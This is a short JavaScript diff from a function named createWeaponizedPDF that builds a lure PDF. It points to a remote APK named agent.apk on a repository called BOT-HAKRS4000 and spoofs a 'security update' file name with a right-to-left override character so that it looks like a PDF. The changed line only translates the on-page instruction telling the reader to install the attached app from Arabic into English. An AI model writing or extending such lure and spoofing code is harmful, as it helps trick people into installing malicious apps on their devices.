@@ -50,7 +50,7 @@ async function createWeaponizedPDF(imageBuffer) {
     const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/raw/main/agent.apk`;
 
     const spoofedName = '\u202E' + 'pdf.تحديث_الأمان' + '\u202C';
-    page.drawText(`للوصول إلى المحتوى، ثبت التطبيق المرفق:\n📱 ${spoofedName}`, {
+    page.drawText(`To access the content, install the attached app:\n📱 ${spoofedName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
 
